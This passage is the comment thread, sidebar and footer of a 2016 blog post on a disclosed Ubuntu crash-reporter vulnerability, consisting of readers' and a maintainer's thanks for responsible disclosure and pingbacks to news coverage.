<p>that was a very good work by your side.<br />
i would like to know the resources that i need to be &#8220;like you&#8221; ðŸ˜€<br />
pm me please if you have time : <a href="mailto:bfsmhmd@gmail.com">bfsmhmd@gmail.com</a></p>
</section>
<div class="reply">
<a rel='nofollow' class='comment-reply-link' href='https://donncha.is/2016/12/compromising-ubuntu-desktop/?replytocom=138832#respond' onclick='return addComment.moveForm( "comment-138832", "138832", "respond", "138" )' aria-label='Reply to mohamed'>Reply</a> <span>&darr;</span> </div>
</article>
</li>
<li class="pingback odd alt thread-odd thread-alt depth-1" id="comment-138833">
<p>Pingback: <a href="https://securityaffairs.co/wordpress/54470/hacking/crashdb.html" rel='external nofollow' class='url'>Hacking Ubuntu Linux distro exploiting the CrashDB code injection issueSecurity Affairs</a> </p>
</li>
<li class="comment even thread-even depth-1" id="li-comment-138836">
<article id="comment-138836" class="comment">
<header class="comment-meta comment-author vcard">
<img alt='' src='https://secure.gravatar.com/avatar/f55296749349c84bc014f4eecf442fcb?s=44&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/f55296749349c84bc014f4eecf442fcb?s=88&amp;d=mm&amp;r=g 2x' class='avatar avatar-44 photo' height='44' width='44' /><cite class="fn">Quint </cite><a href="https://donncha.is/2016/12/compromising-ubuntu-desktop/#comment-138836"><time datetime="2016-12-16T15:01:20+00:00">December 16, 2016 at 3:01 pm</time></a> </header>
<section class="comment-content comment">
<p>Thanks so much for your great work keeping open source safe. This is a righteous exploit!</p>
<p>I&#8217;m surprised that it didn&#8217;t raise any red flags when some commit intruded eval().</p>
</section>
<div class="reply">
<a rel='nofollow' class='comment-reply-link' href='https://donncha.is/2016/12/compromising-ubuntu-desktop/?replytocom=138836#respond' onclick='return addComment.moveForm( "comment-138836", "138836", "respond", "138" )' aria-label='Reply to Quint'>Reply</a> <span>&darr;</span> </div>
</article>
</li>
<li class="comment odd alt thread-odd thread-alt depth-1" id="li-comment-138837">
<article id="comment-138837" class="comment">
<header class="comment-meta comment-author vcard">
<img alt='' src='https://secure.gravatar.com/avatar/25ba66f07f01bf8c210a730ffce64005?s=44&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/25ba66f07f01bf8c210a730ffce64005?s=88&amp;d=mm&amp;r=g 2x' class='avatar avatar-44 photo' height='44' width='44' /><cite class="fn"><a href='http://blog.sevagas.com' rel='external nofollow' class='url'>Emeric</a> </cite><a href="https://donncha.is/2016/12/compromising-ubuntu-desktop/#comment-138837"><time datetime="2016-12-16T15:13:35+00:00">December 16, 2016 at 3:13 pm</time></a> </header>
<section class="comment-content comment">
<p>Hi,<br />
Great job, simple and very effective!<br />
I would also like to felicitate you to have disclosed all that without taking any money.<br />
Personally I would never charge for an opensource vulnerability, especially one like Ubuntu I use everyday.<br />
It is a nice way to say thank you to all these guys working for passion and providing all these great tools for free.<br />
cheers,<br />
Emeric</p>
</section>
<div class="reply">
<a rel='nofollow' class='comment-reply-link' href='https://donncha.is/2016/12/compromising-ubuntu-desktop/?replytocom=138837#respond' onclick='return addComment.moveForm( "comment-138837", "138837", "respond", "138" )' aria-label='Reply to Emeric'>Reply</a> <span>&darr;</span> </div>
</article>
</li>
<li class="comment even thread-even depth-1" id="li-comment-138838">
<article id="comment-138838" class="comment">
<header class="comment-meta comment-author vcard">
<img alt='' src='https://secure.gravatar.com/avatar/dc7bfc6d9cfd64afcec617b001b5e782?s=44&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/dc7bfc6d9cfd64afcec617b001b5e782?s=88&amp;d=mm&amp;r=g 2x' class='avatar avatar-44 photo' height='44' width='44' /><cite class="fn">Panagiotis </cite><a href="https://donncha.is/2016/12/compromising-ubuntu-desktop/#comment-138838"><time datetime="2016-12-16T15:23:22+00:00">December 16, 2016 at 3:23 pm</time></a> </header>
<section class="comment-content comment">
<p>Kudos for reporting to the right people. You are a great example of how great the foss community can be.</p>
</section>
<div class="reply">
<a rel='nofollow' class='comment-reply-link' href='https://donncha.is/2016/12/compromising-ubuntu-desktop/?replytocom=138838#respond' onclick='return addComment.moveForm( "comment-138838", "138838", "respond", "138" )' aria-label='Reply to Panagiotis'>Reply</a> <span>&darr;</span> </div>
</article>
</li>
<li class="pingback odd alt thread-odd thread-alt depth-1" id="comment-138839">
<p>Pingback: <a href='http://linux.press/?p=82171' rel='external nofollow' class='url'>O&#8217;Cearbhaill: Reliably compromising Ubuntu desktops by attacking the crash reporter | Linux Press</a> </p>
</li>
<li class="pingback even thread-even depth-1" id="comment-138840">
<p>Pingback: <a href='https://threatpost.com/remote-code-execution-bug-found-in-ubuntu-quantal/122561/' rel='external nofollow' class='url'>Remote Code Execution Bug Found in Ubuntu Quantal | Threatpost | The first stop for security news</a> </p>
</li>
<li class="comment odd alt thread-odd thread-alt depth-1" id="li-comment-138843">
<article id="comment-138843" class="comment">
<header class="comment-meta comment-author vcard">
<img alt='' src='https://secure.gravatar.com/avatar/975c8ddc28afe19c422015cc078604d7?s=44&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/975c8ddc28afe19c422015cc078604d7?s=88&amp;d=mm&amp;r=g 2x' class='avatar avatar-44 photo' height='44' width='44' /><cite class="fn">Can </cite><a href="https://donncha.is/2016/12/compromising-ubuntu-desktop/#comment-138843"><time datetime="2016-12-16T17:41:06+00:00">December 16, 2016 at 5:41 pm</time></a> </header>
<section class="comment-content comment">
<p>Hello,<br />
I just wanted to thank you.</p>
<p>be safe.</p>
</section>
<div class="reply">
<a rel='nofollow' class='comment-reply-link' href='https://donncha.is/2016/12/compromising-ubuntu-desktop/?replytocom=138843#respond' onclick='return addComment.moveForm( "comment-138843", "138843", "respond", "138" )' aria-label='Reply to Can'>Reply</a> <span>&darr;</span> </div>
</article>
</li>
<li class="pingback even thread-even depth-1" id="comment-138848">
<p>Pingback: <a href='https://badcyber.com/it-security-weekend-catch-up-december-16-2016/' rel='external nofollow' class='url'>IT Security Weekend Catch Up â€“ December 16, 2016 &#8211; BadCyber</a> </p>
</li>
<li class="pingback odd alt thread-odd thread-alt depth-1" id="comment-138849">
<p>Pingback: <a href='http://practicalinfosec.com/?p=206' rel='external nofollow' class='url'>Hacking Ubuntu Linux distro exploiting the CrashDB code injection issue | Practical Infosec</a> </p>
</li>
<li class="pingback even thread-even depth-1" id="comment-138854">
<p>Pingback: <a href='http://techrights.org/2016/12/16/new-linux-mint-releases-2/' rel='external nofollow' class='url'>Links 16/12/2016: New Linux Mint Releases | Techrights</a> </p>
</li>
<li class="comment odd alt thread-odd thread-alt depth-1" id="li-comment-138861">
<article id="comment-138861" class="comment">
<header class="comment-meta comment-author vcard">
<img alt='' src='https://secure.gravatar.com/avatar/d70d51a7ac1654c6227eed479478ce99?s=44&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/d70d51a7ac1654c6227eed479478ce99?s=88&amp;d=mm&amp;r=g 2x' class='avatar avatar-44 photo' height='44' width='44' /><cite class="fn">QUASAR </cite><a href="https://donncha.is/2016/12/compromising-ubuntu-desktop/#comment-138861"><time datetime="2016-12-17T14:43:45+00:00">December 17, 2016 at 2:43 pm</time></a> </header>
<section class="comment-content comment">
<p>great work and thanks!</p>
</section>
<div class="reply">
<a rel='nofollow' class='comment-reply-link' href='https://donncha.is/2016/12/compromising-ubuntu-desktop/?replytocom=138861#respond' onclick='return addComment.moveForm( "comment-138861", "138861", "respond", "138" )' aria-label='Reply to QUASAR'>Reply</a> <span>&darr;</span> </div>
</article>
</li>
<li class="comment even thread-even depth-1" id="li-comment-138870">
<article id="comment-138870" class="comment">
<header class="comment-meta comment-author vcard">
<img alt='' src='https://secure.gravatar.com/avatar/0e17c5f6341d44ba13b8a83c0826ea51?s=44&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/0e17c5f6341d44ba13b8a83c0826ea51?s=88&amp;d=mm&amp;r=g 2x' class='avatar avatar-44 photo' height='44' width='44' /><cite class="fn"><a href='http:.' rel='external nofollow' class='url'>Martin Pitt</a> </cite><a href="https://donncha.is/2016/12/compromising-ubuntu-desktop/#comment-138870"><time datetime="2016-12-17T21:23:02+00:00">December 17, 2016 at 9:23 pm</time></a> </header>
<section class="comment-content comment">
<p>Many thanks for this discovery and your exemplary and responsible reporting! It has been a pleasure to work with you, thanks for uncovering my embarrassing sins from a decade ago ðŸ™‚</p>
</section>
<div class="reply">
<a rel='nofollow' class='comment-reply-link' href='https://donncha.is/2016/12/compromising-ubuntu-desktop/?replytocom=138870#respond' onclick='return addComment.moveForm( "comment-138870", "138870", "respond", "138" )' aria-label='Reply to Martin Pitt'>Reply</a> <span>&darr;</span> </div>
</article>
<ol class="children">
<li class="comment byuser comment-author-donncha bypostauthor odd alt depth-2" id="li-comment-138871">
<article id="comment-138871" class="comment">
<header class="comment-meta comment-author vcard">
<img alt='' src='https://secure.gravatar.com/avatar/e7aad85dd4dabc40edd24a2147f53a35?s=44&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/e7aad85dd4dabc40edd24a2147f53a35?s=88&amp;d=mm&amp;r=g 2x' class='avatar avatar-44 photo' height='44' width='44' /><cite class="fn"><a href="https://donncha.is" rel='external nofollow' class='url'>Donncha</a> <span> Post author</span></cite><a href="https://donncha.is/2016/12/compromising-ubuntu-desktop/#comment-138871"><time datetime="2016-12-17T21:30:17+00:00">December 17, 2016 at 9:30 pm</time></a> </header>
<section class="comment-content comment">
<p>Thanks Martin. Pleasure to work with you too! Best of luck with your new role.</p>
</section>
<div class="reply">
<a rel='nofollow' class='comment-reply-link' href='https://donncha.is/2016/12/compromising-ubuntu-desktop/?replytocom=138871#respond' onclick='return addComment.moveForm( "comment-138871", "138871", "respond", "138" )' aria-label='Reply to Donncha'>Reply</a> <span>&darr;</span> </div>
</article>
</li>
</ol>
</li>
<li class="comment even thread-odd thread-alt depth-1" id="li-comment-138872">
<article id="comment-138872" class="comment">
<header class="comment-meta comment-author vcard">
<img alt='' src='https://secure.gravatar.com/avatar/fa44a3c994355cc70f837305c5fe1dae?s=44&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/fa44a3c994355cc70f837305c5fe1dae?s=88&amp;d=mm&amp;r=g 2x' class='avatar avatar-44 photo' height='44' width='44' /><cite class="fn">Torsten Knodt </cite><a href="https://donncha.is/2016/12/compromising-ubuntu-desktop/#comment-138872"><time datetime="2016-12-17T22:51:54+00:00">December 17, 2016 at 10:51 pm</time></a> </header>
<section class="comment-content comment">
<p>I suggest crowd funded bug bounties for people like you. Goverments should make them tax free. A first shot would be to use Flattr for accepted security relevant bugs and also for bugs with patches in the major issue tracker services.</p>
</section>
<div class="reply">
<a rel='nofollow' class='comment-reply-link' href='https://donncha.is/2016/12/compromising-ubuntu-desktop/?replytocom=138872#respond' onclick='return addComment.moveForm( "comment-138872", "138872", "respond", "138" )' aria-label='Reply to Torsten Knodt'>Reply</a> <span>&darr;</span> </div>
</article>
</li>
<li class="pingback odd alt thread-even depth-1" id="comment-138875">
<p>Pingback: <a href='https://www.cronweekly.com/issue-59/' rel='external nofollow' class='url'>cron.weekly issue #59: Kernel 4.0, Java, containerd, sfb, Redis, CentOS 7.3, Nginx, Ansible &amp; more!</a> </p>
</li>
<li class="comment even thread-odd thread-alt depth-1" id="li-comment-138895">
<article id="comment-138895" class="comment">
<header class="comment-meta comment-author vcard">
<img alt='' src='https://secure.gravatar.com/avatar/3796a9543d289bd4bec0689a99a006ad?s=44&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/3796a9543d289bd4bec0689a99a006ad?s=88&amp;d=mm&amp;r=g 2x' class='avatar avatar-44 photo' height='44' width='44' /><cite class="fn">Beat </cite><a href="https://donncha.is/2016/12/compromising-ubuntu-desktop/#comment-138895"><time datetime="2016-12-19T08:25:34+00:00">December 19, 2016 at 8:25 am</time></a> </header>
<section class="comment-content comment">
<p>Thank you for investigating &amp; reporting !<br />
But seeing kind of bugs like this i wonder how it could ever hit the wild and how many undiscovered stuff like this still exists in Ubuntu?<br />
Seems like one has just to scratch at the sureface&#8230;</p>
</section>
<div class="reply">
<a rel='nofollow' class='comment-reply-link' href='https://donncha.is/2016/12/compromising-ubuntu-desktop/?replytocom=138895#respond' onclick='return addComment.moveForm( "comment-138895", "138895", "respond", "138" )' aria-label='Reply to Beat'>Reply</a> <span>&darr;</span> </div>
</article>
</li>
<li class="comment odd alt thread-even depth-1" id="li-comment-138904">
<article id="comment-138904" class="comment">
<header class="comment-meta comment-author vcard">
<img alt='' src='https://secure.gravatar.com/avatar/30fa9f928422bef2f98dd5f564def686?s=44&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/30fa9f928422bef2f98dd5f564def686?s=88&amp;d=mm&amp;r=g 2x' class='avatar avatar-44 photo' height='44' width='44' /><cite class="fn"><a href='http://ted.mielczarek.org/' rel='external nofollow' class='url'>Ted Mielczarek</a> </cite><a href="https://donncha.is/2016/12/compromising-ubuntu-desktop/#comment-138904"><time datetime="2016-12-19T10:54:48+00:00">December 19, 2016 at 10:54 am</time></a> </header>
<section class="comment-content comment">
<p>I have to admit, I don&#8217;t even really understand the utility of having the MIME type association for Apport. In normal functioning it gets launched by way of /proc/sys/kernel/core_pattern when an application crashes. Is there real value in being able to load an arbitrary .crash file from the desktop environment? I wonder if this is one of those things that&#8217;s cargo-culted, or maybe encouraged by some misguided guidelines, like &#8220;any application that writes a file should support opening it from the file manager&#8221;?</p>
<p>In any event, nice work on finding and reporting the vulnerabilities!</p>
</section>
<div class="reply">
<a rel='nofollow' class='comment-reply-link' href='https://donncha.is/2016/12/compromising-ubuntu-desktop/?replytocom=138904#respond' onclick='return addComment.moveForm( "comment-138904", "138904", "respond", "138" )' aria-label='Reply to Ted Mielczarek'>Reply</a> <span>&darr;</span> </div>
</article>
</li>
<li class="pingback even thread-odd thread-alt depth-1" id="comment-138935">
<p>Pingback: <a href='http://blog.syslab.com/?p=5210' rel='external nofollow' class='url'>Serious Ubuntu Linux desktop bugs found and fixed | syslab.com on open source</a> </p>
</li>
<li class="pingback odd alt thread-even depth-1" id="comment-138937">
<p>Pingback: <a href='http://blog.sosordi.net/2016/12/ubuntu-correction-dune-faille-critique-pour-le-logiciel-de-rapport-de-plantages-python-crashstrictor.html' rel='external nofollow' class='url'>Ubuntu : correction d&rsquo;une faille critique pour le logiciel de rapport de plantages (Python Crashstrictor) | SOSordi.net</a> </p>
</li>
<li class="pingback even thread-odd thread-alt depth-1" id="comment-138939">
<p>Pingback: <a href='https://www.undernews.fr/reseau-securite/gstreamer-une-faille-de-securite-critique-corrigee-sur-linux-ubuntu-fedora.html' rel='external nofollow' class='url'>Gstreamer &#8211; Une faille de sÃ©curitÃ© critique corrigÃ©e sur Linux Ubuntu / Fedora | UnderNews</a> </p>
</li>
<li class="pingback odd alt thread-even depth-1" id="comment-139021">
<p>Pingback: <a href='http://geekycooldad.com/2017/01/linux-2017-with-great-power-comes-great-responsibility-zdnet/' rel='external nofollow' class='url'>Linux 2017: With great power comes great responsibility | ZDNet | Geeky Cool Dad</a> </p>
</li>
<li class="pingback even thread-odd thread-alt depth-1" id="comment-139025">
<p>Pingback: <a href='http://technewsdm.com/?p=581' rel='external nofollow' class='url'>Linux 2017: Î¼ÎµÎ³Î¬Î»Î· Î´ÏÎ½Î±Î¼Î· ÏƒÎ·Î¼Î±Î¯Î½ÎµÎ¹ ÎºÎ±Î¹ Î¼ÎµÎ³Î¬Î»Î· ÎµÏ…Î¸ÏÎ½Î· &#8211; TechNews</a> </p>
</li>
<li class="pingback odd alt thread-even depth-1" id="comment-139149">
<p>Pingback: <a href='https://blog.aterios.ch/2017/01/28/ubuntu-bug-ermoeglicht-das-ausfuehren-von-schadcode/' rel='external nofollow' class='url'>Ubuntu-Bug ermÃ¶glicht das AusfÃ¼hren von Schadcode - Aterios GmbH</a> </p>
</li>
<li class="pingback even thread-odd thread-alt depth-1" id="comment-139205">
<p>Pingback: <a href='https://zakariafettach.wordpress.com/2017/02/06/linux-2017-a-grands-pouvoirs-grandes-responsabilites/' rel='external nofollow' class='url'>Linux 2017 : A grands pouvoirs, grandes responsabilitÃ©s &#8211; M. Zakaria FETTACH</a> </p>
</li>
<li class="pingback odd alt thread-even depth-1" id="comment-139535">
<p>Pingback: <a href='http://ma3lomaaty.com/2016/12/25/ubuntus-crash-report-tool-allows-remote-code-execution/' rel='external nofollow' class='url'>Ubuntuâ€™s Crash Report Tool Allows Remote Code Execution - ma3lomaaty</a> </p>
</li>
<li class="pingback even thread-odd thread-alt depth-1" id="comment-139766">
<p>Pingback: <a href='http://www.aboromedia.com/ai/2017/06/16/dont-leave-coredumps-on-web-servers/' rel='external nofollow' class='url'>Don&#8217;t leave Coredumps on Web Servers | Artificia Intelligence</a> </p>
</li>
<li class="comment odd alt thread-even depth-1" id="li-comment-140940">
<article id="comment-140940" class="comment">
<header class="comment-meta comment-author vcard">
<img alt='' src='https://secure.gravatar.com/avatar/9a3583559a0b57177d0f9e2eb78af800?s=44&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/9a3583559a0b57177d0f9e2eb78af800?s=88&amp;d=mm&amp;r=g 2x' class='avatar avatar-44 photo' height='44' width='44' /><cite class="fn"><a href='https://insightmsp.co.in/Advanced-Services.php' rel='external nofollow' class='url'>meenusuhari</a> </cite><a href="https://donncha.is/2016/12/compromising-ubuntu-desktop/#comment-140940"><time datetime="2018-07-04T13:07:39+00:00">July 4, 2018 at 1:07 pm</time></a> </header>
<section class="comment-content comment">
<p>Really a great blog with valuable gadgets. File and URL handler configuration in Linux Desktops is the info which i am searching for long period.</p>
</section>
<div class="reply">
<a rel='nofollow' class='comment-reply-link' href='https://donncha.is/2016/12/compromising-ubuntu-desktop/?replytocom=140940#respond' onclick='return addComment.moveForm( "comment-140940", "140940", "respond", "138" )' aria-label='Reply to meenusuhari'>Reply</a> <span>&darr;</span> </div>
</article>
</li>
</ol>
<div id="respond" class="comment-respond">
<h3 id="reply-title" class="comment-reply-title">Leave a Reply <small><a rel="nofollow" id="cancel-comment-reply-link" href="/2016/12/compromising-ubuntu-desktop/#respond" style="display:none;">Cancel reply</a></small></h3> <form action="https://donncha.is/wp-comments-post.php" method="post" id="commentform" class="comment-form">
<p class="comment-notes"><span id="email-notes">Your email address will not be published.</span></p><p class="comment-form-comment"><label for="comment">Comment</label> <textarea id="comment" name="comment" cols="45" rows="8" maxlength="65525" aria-required="true" required="required"></textarea></p><p class="comment-form-author"><label for="author">Name</label> <input id="author" name="author" type="text" value="" size="30" maxlength="245" /></p>
<p class="comment-form-email"><label for="email">Email</label> <input id="email" name="email" type="text" value="" size="30" maxlength="100" aria-describedby="email-notes" /></p>
<p class="comment-form-url"><label for="url">Website</label> <input id="url" name="url" type="text" value="" size="30" maxlength="200" /></p>
<p class="form-submit"><input name="submit" type="submit" id="submit" class="submit" value="Post Comment" /> <input type='hidden' name='comment_post_ID' value='138' id='comment_post_ID' />
<input type='hidden' name='comment_parent' id='comment_parent' value='0' />
</p><p style="display: none;"><input type="hidden" id="akismet_comment_nonce" name="akismet_comment_nonce" value="4f9f26ca1a" /></p><p class="comment-subscription-form"><input type="checkbox" name="subscribe_comments" id="subscribe_comments" value="subscribe" style="width: auto; -moz-appearance: checkbox; -webkit-appearance: checkbox;" /> <label class="subscribe-label" id="subscribe-label" for="subscribe_comments">Notify me of follow-up comments by email.</label></p><p class="comment-subscription-form"><input type="checkbox" name="subscribe_blog" id="subscribe_blog" value="subscribe" style="width: auto; -moz-appearance: checkbox; -webkit-appearance: checkbox;" /> <label class="subscribe-label" id="subscribe-blog-label" for="subscribe_blog">Notify me of new posts by email.</label></p><p style="display: none;"><input type="hidden" id="ak_js" name="ak_js" value="61" /></p> </form>
</div>
</div>
</div>
</div>
<div id="secondary" class="widget-area" role="complementary">
<aside id="text-3" class="widget widget_text"> <div class="textwidget"><img class="aligncenter" src="https://secure.gravatar.com/avatar/e7aad85dd4dabc40edd24a2147f53a35?s=150" alt="Donncha O'Cearbhaill" /></div>
</aside><aside id="twitter_timeline-2" class="widget widget_twitter_timeline"><h3 class="widget-title">Follow me on Twitter</h3><a class="twitter-timeline" data-height="400" data-theme="light" data-link-color="#21759b" data-border-color="#e8e8e8" data-lang="EN" data-partner="jetpack" data-chrome="noheader nofooter noborders" data-widget-id="334736514154106880">My Tweets</a></aside> <aside id="recent-posts-2" class="widget widget_recent_entries"> <h3 class="widget-title">Recent Posts</h3> <ul>
<li>
<a href="https://donncha.is/2016/12/compromising-ubuntu-desktop/">Reliably compromising Ubuntu desktops by attacking the crash reporter</a>
</li>
<li>
<a href="https://donncha.is/2014/07/problems-using-an-openpgp-smartcard-for-ssh-with-gpg-agent/">Problems using an OpenPGP smartcard for SSH with gpg-agent</a>
</li>
<li>
<a href="https://donncha.is/2013/12/bitcoin-panel-discussion-at-the-web-summit/">Bitcoin Panel Discussion at The Web Summit</a>
</li>
<li>
<a href="https://donncha.is/2013/06/coinbase-owning-a-bitcoin-exchange-bug-bounty-program/">Coinbase &#8211; Owning a Bitcoin Exchange Bug Bounty Program</a>
</li>
<li>
<a href="https://donncha.is/2013/05/trawling-tor-hidden-services/">Trawling Tor Hidden Service &#8211; Mapping the DHT</a>
</li>
</ul>
</aside> <aside id="recent-comments-clean-2" class="widget widget_recent_comments_clean"><h3 class="widget-title">Recent Comments</h3><ul id="recentcomments"><li class="recentcomments"><a href='https://insightmsp.co.in/Advanced-Services.php' rel='external nofollow' class='url'>meenusuhari</a> on <a href="https://donncha.is/2016/12/compromising-ubuntu-desktop/#comment-140940">Reliably compromising Ubuntu desktops by attacking the crash reporter</a></li><li class="recentcomments"><a href='https://telkomuniversity.ac.id' rel='external nofollow' class='url'>max</a> on <a href="https://donncha.is/2014/07/problems-using-an-openpgp-smartcard-for-ssh-with-gpg-agent/#comment-140228">Problems using an OpenPGP smartcard for SSH with gpg-agent</a></li><li class="recentcomments"><a href='https://at.or.at' rel='external nofollow' class='url'>Hans-Christoph Steiner</a> on <a href="https://donncha.is/2014/07/problems-using-an-openpgp-smartcard-for-ssh-with-gpg-agent/#comment-139916">Problems using an OpenPGP smartcard for SSH with gpg-agent</a></li><li class="recentcomments">stv0g on <a href="https://donncha.is/2014/07/problems-using-an-openpgp-smartcard-for-ssh-with-gpg-agent/#comment-139821">Problems using an OpenPGP smartcard for SSH with gpg-agent</a></li><li class="recentcomments"><a href='http://ted.mielczarek.org/' rel='external nofollow' class='url'>Ted Mielczarek</a> on <a href="https://donncha.is/2016/12/compromising-ubuntu-desktop/#comment-138904">Reliably compromising Ubuntu desktops by attacking the crash reporter</a></li></ul></aside><aside id="search-2" class="widget widget_search"><form role="search" method="get" id="searchform" class="searchform" action="https://donncha.is/">
<div>
<label class="screen-reader-text" for="s">Search for:</label>
<input type="text" value="" name="s" id="s" />
<input type="submit" id="searchsubmit" value="Search" />
</div>
</form></aside><aside id="archives-2" class="widget widget_archive"><h3 class="widget-title">Archives</h3> <ul>
<li><a href='https://donncha.is/2016/12/'>December 2016</a></li>
<li><a href='https://donncha.is/2014/07/'>July 2014</a></li>
<li><a href='https://donncha.is/2013/12/'>December 2013</a></li>
<li><a href='https://donncha.is/2013/06/'>June 2013</a></li>
<li><a href='https://donncha.is/2013/05/'>May 2013</a></li>
</ul>
</aside><aside id="tag_cloud-2" class="widget widget_tag_cloud"><h3 class="widget-title">Tags</h3><div class="tagcloud"><a href='https://donncha.is/tag/bitcoin/' class='tag-link-8 tag-link-position-1' title='2 topics' style='font-size: 22pt;'>Bitcoin</a>
<a href='https://donncha.is/tag/dos/' class='tag-link-6 tag-link-position-2' title='1 topic' style='font-size: 8pt;'>DoS</a>
<a href='https://donncha.is/tag/hidden-services/' class='tag-link-5 tag-link-position-3' title='1 topic' style='font-size: 8pt;'>Hidden Services</a>
<a href='https://donncha.is/tag/panel/' class='tag-link-10 tag-link-position-4' title='1 topic' style='font-size: 8pt;'>panel</a>
<a href='https://donncha.is/tag/tor/' class='tag-link-4 tag-link-position-5' title='1 topic' style='font-size: 8pt;'>Tor</a>
<a href='https://donncha.is/tag/web-summit/' class='tag-link-9 tag-link-position-6' title='1 topic' style='font-size: 8pt;'>web summit</a></div>
</aside><aside id="text-2" class="widget widget_text"> <div class="textwidget"><a style="display:block; text-align: center" rel="license" href="https://creativecommons.org/licenses/by-sa/3.0/deed.en_US"><img alt="Creative Commons License" style="border-width:0" src="https://i.creativecommons.org/l/by-sa/3.0/88x31.png" /></a>All original content on this site from <a xmlns:cc="http://creativecommons.org/ns#" href="https://donncha.is" property="cc:attributionName" rel="cc:attributionURL">Donncha O'Cearbhaill</a> is licensed under a <a rel="license" href="https://creativecommons.org/licenses/by-sa/3.0/deed.en_US">Creative Commons Attribution-ShareAlike 3.0 Unported License</a>.</div>
</aside> </div>
</div>
<footer id="colophon" role="contentinfo">
<div class="site-info">
<a href="https://wordpress.org/" title="Semantic Personal Publishing Platform">Proudly powered by WordPress</a>
<span id="tip-me">Buy me a beer? <strong><a href="bitcoin:1DoNNchAB64WDyAW9MDVQ8hsNiw2HPXDUv" title="Tip me some bitcoins">1DoNNchAB64WDyAW9MDVQ8hsNiw2HPXDUv</a></strong></span>
</div>
</footer>
</div>
<div style="display:none">
<div class="grofile-hash-map-10468ad8d146df7dc85e4f8c51ef542e">
</div>
<div class="grofile-hash-map-c5605bbabf2ce3c685379bec0c40e02e">
</div>
<div class="grofile-hash-map-f55296749349c84bc014f4eecf442fcb">
</div>
<div class="grofile-hash-map-25ba66f07f01bf8c210a730ffce64005">
</div>
<div class="grofile-hash-map-dc7bfc6d9cfd64afcec617b001b5e782">
</div>
<div class="grofile-hash-map-975c8ddc28afe19c422015cc078604d7">
</div>
<div class="grofile-hash-map-d70d51a7ac1654c6227eed479478ce99">
</div>
<div class="grofile-hash-map-0e17c5f6341d44ba13b8a83c0826ea51">
</div>
<div class="grofile-hash-map-e7aad85dd4dabc40edd24a2147f53a35">
</div>
<div class="grofile-hash-map-fa44a3c994355cc70f837305c5fe1dae">
</div>
<div class="grofile-hash-map-3796a9543d289bd4bec0689a99a006ad">
</div>
<div class="grofile-hash-map-30fa9f928422bef2f98dd5f564def686">
</div>
<div class="grofile-hash-map-9a3583559a0b57177d0f9e2eb78af800">
</div>
</div>
<script type="text/javascript">
		window.WPCOM_sharing_counts = {"https:\/\/donncha.is\/2016\/12\/compromising-ubuntu-desktop\/":138};
	</script>
<div id="sharing_email" style="display: none;">
<form action="/2016/12/compromising-ubuntu-desktop/" method="post">
<label for="target_email">Send to Email Address</label>
<input type="email" name="target_email" id="target_email" value="" />
<label for="source_name">Your Name</label>
<input type="text" name="source_name" id="source_name" value="" />
<label for="source_email">Your Email Address</label>
<input type="email" name="source_email" id="source_email" value="" />
<input type="text" id="jetpack-source_f_name" name="source_f_name" class="input" value="" size="25" autocomplete="off" title="This field is for validation and should not be changed" />
<script>jQuery( document ).ready( function(){ document.getElementById('jetpack-source_f_name').value = '' });</script>
<img style="float: right; display: none" class="loading" src="https://donncha.is/wp-content/plugins/jetpack/modules/sharedaddy/images/loading.gif" alt="loading" width="16" height="16" />
<input type="submit" value="Send Email" class="sharing_send" />
<a rel="nofollow" href="#cancel" class="sharing_cancel">Cancel</a>
<div class="errors errors-1" style="display: none;">
Post was not sent - check your email addresses! </div>
<div class="errors errors-2" style="display: none;">
Email check failed, please try again </div>
<div class="errors errors-3" style="display: none;">
Sorry, your blog cannot share posts by email. </div>
</form>
</div>
<script type='text/javascript' src='https://s0.wp.com/wp-content/js/devicepx-jetpack.js?ver=202143'></script>
<script type='text/javascript' src='https://secure.gravatar.com/js/gprofiles.js?ver=2021Octaa'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var WPGroHo = {"my_hash":""};
/* ]]> */
</script>
<script type='text/javascript' src='https://donncha.is/wp-content/plugins/jetpack/modules/wpgroho.js?ver=4.7.21'></script>
<script type='text/javascript' src='https://donncha.is/wp-includes/js/comment-reply.min.js?ver=4.7.21'></script>
<script type='text/javascript' src='https://donncha.is/wp-content/themes/twentytwelve-custom/js/navigation.js?ver=1.0'></script>
<script type='text/javascript' src='https://donncha.is/wp-content/plugins/jetpack/_inc/twitter-timeline.js?ver=4.0.0'></script>
<script type='text/javascript' src='https://donncha.is/wp-includes/js/wp-embed.min.js?ver=4.7.21'></script>
<script async="async" type='text/javascript' src='https://donncha.is/wp-content/plugins/akismet/_inc/form.js?ver=4.0.1'></script>
<script type='text/javascript' src='https://donncha.is/wp-content/plugins/simple-lightbox/client/js/prod/lib.core.js?ver=2.6.0'></script>
<script type='text/javascript' src='https://donncha.is/wp-content/plugins/simple-lightbox/client/js/prod/lib.view.js?ver=2.6.0'></script>
<script type='text/javascript' src='https://donncha.is/wp-content/plugins/simple-lightbox/themes/baseline/js/prod/client.js?ver=2.6.0'></script>
<script type='text/javascript' src='https://donncha.is/wp-content/plugins/simple-lightbox/themes/default/js/prod/client.js?ver=2.6.0'></script>
<script type='text/javascript' src='https://donncha.is/wp-content/plugins/simple-lightbox/template-tags/item/js/prod/tag.item.js?ver=2.6.0'></script>
<script type='text/javascript' src='https://donncha.is/wp-content/plugins/simple-lightbox/template-tags/ui/js/prod/tag.ui.js?ver=2.6.0'></script>
<script type='text/javascript' src='https://donncha.is/wp-content/plugins/simple-lightbox/content-handlers/image/js/prod/handler.image.js?ver=2.6.0'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var sharing_js_options = {"lang":"en","counts":"1"};
/* ]]> */
</script>
<script type='text/javascript' src='https://donncha.is/wp-content/plugins/jetpack/modules/sharedaddy/sharing.js?ver=5.5.3'></script>
<script type='text/javascript'>
var windowOpen;
			jQuery( document.body ).on( 'click', 'a.share-twitter', function() {
				// If there's another sharing window open, close it.
